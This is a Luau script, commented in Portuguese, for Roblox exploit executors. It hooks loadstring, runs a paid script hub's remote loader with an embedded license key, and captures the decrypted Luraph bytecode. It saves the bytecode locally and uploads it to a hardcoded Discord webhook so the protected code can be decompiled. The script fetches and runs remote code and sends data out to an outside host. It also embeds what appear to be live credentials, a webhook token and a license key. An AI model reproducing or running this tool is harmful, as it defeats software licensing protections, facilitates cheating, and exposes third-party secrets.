--!strict
--[[
    Zaphub Extractor - Captura o bytecode final (Luraph) via hook de loadstring
    Plataforma: Delta (qualquer executor com loadstring global reatribuivel)

    COMO FUNCIONA:
      1. Define _G.script_key (sua chave Luarmor)
      2. Hooka a global loadstring (e load) para capturar QUALQUER chunk grande
      3. Executa o loader oficial: loadstring(game:HttpGet('https://zaphub.xyz/Exec'))()
      4. Quando o Luarmor descriptografar o payload e chamar loadstring com o
         bytecode Luraph final, o hook SALVA + ENVIA para o webhook
      5. Depois eu decompilo esse bytecode (Luraph -> Luau limpo)

    SEGURANCA ANTI-TRAVA (padrao da casa):
      - I/O de rede so em task.spawn dedicada
      - Salva o bytecode em arquivo PRIMEIRO (writefile) - mesmo que o envio
        falhe, voce fica com o arquivo
      - Nao interfere na execucao: retorna o loadstring original
]]

--//==============================[ CONFIG ]==============================//--
local WEBHOOK_URL = "https://discord.com/api/webhooks/1398723880369131631/7knZsAymoHblk9BcsXYuI7XT2-8PNHkZJfFbtyLHssHqjW_pXeBQVznZ0lDHz7G9ObRI"
local WEBHOOK_NAME = "Zaphub Extractor"
local SAVE_DIR = "ZaphubExtract"

-- Sua chave Luarmor - define a global DIRETA script_key (padrao oficial:
-- o loader Luarmor le "script_key" como variavel global, nao _G.script_key)
script_key = "nNOnKsJaYhZJPHjsxiLHAyUxUVXqFGsw"
_G.script_key = script_key

-- Comando oficial exato do Zaphub (como o usuario roda no executor):
--   script_key="nNOnKsJaYhZJPHjsxiLHAyUxUVXqFGsw";
--   loadstring(game:HttpGet('https://zaphub.xyz/Exec'))()
local ZAPHUB_SNIPPET = "script_key=%q; loadstring(game:HttpGet('https://zaphub.xyz/Exec'))()"
local ZAPHUB_KEY = "nNOnKsJaYhZJPHjsxiLHAyUxUVXqFGsw"

-- tamanho minimo para considerar "payload real" (bytecode Luraph > 1KB)
local MIN_CAPTURE = 1000
-- captura TODOS os chunks grandes (pode haver varios - mandar todos)
local MAX_CAPTURES = 20

--//==============================[ API COMPAT ]==============================//--
local getExecutorName = (function()
    local fn = identifyexecutor or identify_executor
    if fn then
        local ok, name = pcall(fn)
        if ok and type(name) == "string" then return name end
    end
    return "unknown"
end)()

local copy = (function()
    if setclipboard then return setclipboard end
    if toclipboard then return toclipboard end
    if set_clipboard then return set_clipboard end
    return function() end
end)()

local reqFn = (function()
    if syn and syn.request then return syn.request end
    if request then return request end
    if http and http.request then return http.request end
    return nil
end)()

local writefileFn = writefile
local makefolderFn = makefolder or function() end
local isfileFn = isfile or function() return false end
local readfileFn = readfile
local delfileFn = delfile
local listfilesFn = listfiles or function() return {} end

local function logMsg(msg)
    pcall(print, "[ZaphubExtract] " .. tostring(msg))
end

--//==============================[ BASE64 (envio seguro do bytecode) ]==============================//--
local b64chars = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/"
local function b64encode(data)
    local b = 1
    local out = {}
    local len = #data
    for i = 1, len, 3 do
        local c1 = string.byte(data, i)
        local c2 = i + 1 <= len and string.byte(data, i + 1) or 0
        local c3 = i + 2 <= len and string.byte(data, i + 2) or 0
        local n = c1 * 65536 + c2 * 256 + c3
        local pad = i + 2 > len and 1 or (i + 1 > len and 2 or 0)
        -- 4 caracteres
        out[b] = b64chars:sub(math.floor(n / 262144) % 64 + 1, math.floor(n / 262144) % 64 + 1)
        out[b + 1] = b64chars:sub(math.floor(n / 4096) % 64 + 1, math.floor(n / 4096) % 64 + 1)
        out[b + 2] = b64chars:sub(math.floor(n / 64) % 64 + 1, math.floor(n / 64) % 64 + 1)
        out[b + 3] = b64chars:sub(n % 64 + 1, n % 64 + 1)
        if pad == 1 then out[b + 3] = "=" end
        if pad == 2 then out[b + 2] = "="; out[b + 3] = "=" end
        b = b + 4
    end
    return table.concat(out)
end

--//==============================[ WEBHOOK ]==============================//--
local function jsonString(s)
    s = tostring(s)
    s = s:gsub("\\", "\\\\"):gsub("\"", "\\\""):gsub("\n", "\\n"):gsub("\r", "\\r"):gsub("\t", "\\t")
    s = s:gsub("[%z\1-\31]", function(c) return string.format("\\u%04x", c:byte()) end)
    return "\"" .. s .. "\""
end

local function sendSimple(content, username)
    if not reqFn then return -1 end
    local body = '{"content":' .. jsonString(content) .. ',"username":' .. jsonString(username or WEBHOOK_NAME) .. '}'
    local ok, res = pcall(function()
        return reqFn({
            Url = WEBHOOK_URL,
            Method = "POST",
            Headers = { ["Content-Type"] = "application/json" },
            Body = body,
        })
    end)
    if ok and res then return tonumber(res.StatusCode) or 0 else return -1 end
end

-- Multipart com 1 anexo (bytecode como .txt/base64)
local function sendFileMulti(msg, files)
    if not reqFn then return -1 end
    local boundary = "----ZaphubX" .. tostring(os.clock()):gsub("%.", "") .. "7xK"
    local body = ""
    if msg and #tostring(msg) > 0 then
        body = body .. "--" .. boundary .. "\r\nContent-Disposition: form-data; name=\"content\"\r\n\r\n" .. tostring(msg) .. "\r\n"
    end
    for i = 1, #files do
        body = body .. "--" .. boundary
            .. "\r\nContent-Disposition: form-data; name=\"file" .. tostring(i) .. "\"; filename=\"" .. tostring(files[i].name) .. "\""
            .. "\r\nContent-Type: text/plain; charset=utf-8\r\n\r\n"
            .. tostring(files[i].content)
            .. "\r\n"
    end
    body = body .. "--" .. boundary .. "--\r\n"
    local ok, res = pcall(function()
        return reqFn({
            Url = WEBHOOK_URL,
            Method = "POST",
            Headers = { ["Content-Type"] = "multipart/form-data; boundary=" .. boundary },
            Body = body,
        })
    end)
    if ok and res then return tonumber(res.StatusCode) or 0 else return -1 end
end

--//==============================[ ESTADO DA CAPTURA ]==============================//--
local captured = 0
local captures = {}

-- Envia captura de forma ASSINCRONA (nunca no thread do jogo)
local function sendCaptureAsync(chunk, idx)
    task.spawn(function()
        task.wait(0.1)
        -- codifica em base64 (bytecode binario nao sobrevive a JSON)
        local b64 = b64encode(chunk)
        local msg = "**Zaphub Extractor - CAPTURA " .. tostring(idx) .. "**\n"
            .. "Tamanho bytecode: " .. tostring(#chunk) .. " bytes\n"
            .. "Base64: " .. tostring(#b64) .. " chars\n"
            .. "Executor: " .. getExecutorName
        -- anexo com base64 (cabe no limite de 8MB do Discord)
        local ok = false
        if #b64 < 6000000 then
            local c = sendFileMulti(msg, { { name = "bytecode_" .. tostring(idx) .. ".b64.txt", content = b64 } })
            ok = c >= 200 and c < 300
        end
        -- aviso de erro no envio
        if not ok then
            sendSimple("**Zaphub Extractor** - falha ao enviar captura " .. tostring(idx)
                .. " (base64 " .. tostring(#b64) .. " chars). Arquivo salvo localmente.", WEBHOOK_NAME .. " [AVISO]")
        end
    end)
end

-- Salva o bytecode bruto localmente (PRIMEIRO - garantia)
local function saveCaptureLocal(chunk, idx)
    if not writefileFn then return false end
    local ok = pcall(function()
        pcall(makefolderFn, SAVE_DIR)
        writefileFn(SAVE_DIR .. "/bytecode_" .. tostring(idx) .. ".bin", chunk)
        -- tambem uma copia base64 legivel
        writefileFn(SAVE_DIR .. "/bytecode_" .. tostring(idx) .. ".b64.txt", b64encode(chunk))
    end)
    return ok
end

--//==============================[ HOOK DE LOADSTRING ]==============================//--
local hooked = false
local function installHook()
    -- hooka as globais loadstring e load
    local oldLoadstring = _G.loadstring or _G.load
    if not oldLoadstring then
        logMsg("loadstring nao encontrado - hook impossivel")
        return
    end

    local hookFn = function(s, chunkname)
        local f, err = oldLoadstring(s, chunkname)
        if f and type(s) == "string" and #s >= MIN_CAPTURE and captured < MAX_CAPTURES then
            captured = captured + 1
            local idx = captured
            captures[idx] = s
            logMsg("CAPTURADO chunk #" .. tostring(idx) .. " (" .. tostring(#s) .. " bytes)")
            -- salva local imediatamente (mesmo se envio falhar)
            pcall(saveCaptureLocal, s, idx)
            -- envia assincrono
            sendCaptureAsync(s, idx)
        end
        return f, err
    end

    -- reatribui as globais (metodo mais compativel no Delta)
    _G.loadstring = hookFn
    if _G.load then
        _G.load = hookFn
    end
    hooked = true
    logMsg("Hook de loadstring instalado (min=" .. tostring(MIN_CAPTURE) .. " bytes)")
end

--//==============================[ EXECUCAO DO LOADER OFICIAL ]==============================//--
local function runOfficialLoader()
    logMsg("Montando snippet oficial com script_key inline...")
    -- comando literal identico ao que o usuario roda:
    --   script_key="nNOnKsJaYhZJPHjsxiLHAyUxUVXqFGsw";
    --   loadstring(game:HttpGet('https://zaphub.xyz/Exec'))()
    local snippet = string.format(ZAPHUB_SNIPPET, ZAPHUB_KEY)
    logMsg("Executando: " .. snippet)
    local okRun, errRun = pcall(function()
        local f = loadstring(snippet)
        if f then f() end
    end)
    if not okRun then
        logMsg("Erro ao executar snippet: " .. tostring(errRun))
        return false
    end
    return true
end

--//==============================[ UI MINIMALISTA ]==============================//--
local Players = game:GetService("Players")
local function makeUI()
    local gui = Instance.new("ScreenGui")
    gui.Name = "ZaphubExtractor"
    gui.ResetOnSpawn = false
    gui.IgnoreGuiInset = true
    gui.DisplayOrder = 999
    gui.Parent = Players.LocalPlayer:WaitForChild("PlayerGui")

    local bg = Instance.new("Frame")
    bg.AnchorPoint = Vector2.new(0.5, 0.5)
    bg.Position = UDim2.new(0.5, 0, 0.5, 0)
    bg.Size = UDim2.new(0, 340, 0, 200)
    bg.BackgroundColor3 = Color3.fromRGB(15, 17, 25)
    bg.BackgroundTransparency = 0.05
    bg.BorderSizePixel = 0
    bg.Parent = gui
    pcall(function()
        local corner = Instance.new("UICorner")
        corner.CornerRadius = UDim.new(0, 14)
        corner.Parent = bg
    end)

    local title = Instance.new("TextLabel")
    title.BackgroundTransparency = 1
    title.Position = UDim2.new(0, 0, 0, 10)
    title.Size = UDim2.new(1, 0, 0, 34)
    title.Font = Enum.Font.GothamBold
    title.Text = "ZAPHUB EXTRACTOR"
    title.TextColor3 = Color3.fromRGB(255, 255, 255)
    title.TextSize = 18
    title.Parent = bg

    local status = Instance.new("TextLabel")
    status.BackgroundTransparency = 1
    status.Position = UDim2.new(0, 12, 0, 50)
    status.Size = UDim2.new(1, -24, 0, 100)
    status.Font = Enum.Font.Gotham
    status.Text = "Instalando hook...\nExecutando loader..."
    status.TextColor3 = Color3.fromRGB(255, 200, 80)
    status.TextSize = 13
    status.TextWrapped = true
    status.Parent = bg

    return {
        gui = gui,
        setStatus = function(text, color)
            status.Text = text
            if color then status.TextColor3 = color end
        end,
    }
end

local ui = (function()
    local ok, u = pcall(makeUI)
    if ok and u then return u end
    return { gui = nil, setStatus = function(text) logMsg("[status] " .. tostring(text)) end }
end)()

--//==============================[ MAIN ]==============================//--
local function mainFlow()
    ui.setStatus("Instalando hook de loadstring...", Color3.fromRGB(255, 200, 80))
    installHook()

    -- ping de teste
    if reqFn then
        task.spawn(function()
            task.wait(0.2)
            local code = sendSimple(
                "**Zaphub Extractor - TESTE**\nHook instalado. Aguardando bytecode.\nExecutor: " .. getExecutorName,
                WEBHOOK_NAME .. " [TESTE]"
            )
            logMsg("Ping: codigo " .. tostring(code))
        end)
    end

    ui.setStatus("Executando loader oficial zaphub.xyz/Exec...", Color3.fromRGB(255, 200, 80))
    local ok = runOfficialLoader()

    if not ok then
        ui.setStatus("Falha ao executar loader. Veja o console.", Color3.fromRGB(255, 80, 80))
        return
    end

    ui.setStatus("Loader executado. Capturas: " .. tostring(captured)
        .. "\nAguardando bytecode do Luarmor...", Color3.fromRGB(80, 230, 120))

    -- monitora capturas por ate 60s (o Luarmor pode demorar)
    local waited = 0
    while captured == 0 and waited < 60 do
        task.wait(1)
        waited = waited + 1
    end

    if captured > 0 then
        ui.setStatus("Capturados " .. tostring(captured) .. " chunk(s)!\n"
            .. "Salvos em: " .. SAVE_DIR .. "/", Color3.fromRGB(80, 230, 120))
    else
        ui.setStatus("Nenhum chunk capturado em 60s.\n"
            .. "Se o Zaphub rodou, tente de novo (Luarmor pode variar).", Color3.fromRGB(255, 120, 80))
    end
end

task.spawn(function()
    xpcall(mainFlow, function(err)
        local ok, trace = pcall(debug.traceback, tostring(err), 2)
        pcall(logMsg, "ERRO RAIZ: " .. tostring(err) .. "\n" .. tostring(ok and trace or ""))
        ui.setStatus("ERRO: " .. tostring(err), Color3.fromRGB(255, 80, 80))
        if reqFn then
            task.spawn(function()
                sendSimple("**Zaphub Extractor - ERRO**\n```\n" .. tostring(err) .. "\n```", WEBHOOK_NAME .. " [ERRO]")
            end)
        end
        return nil
    end)
end)
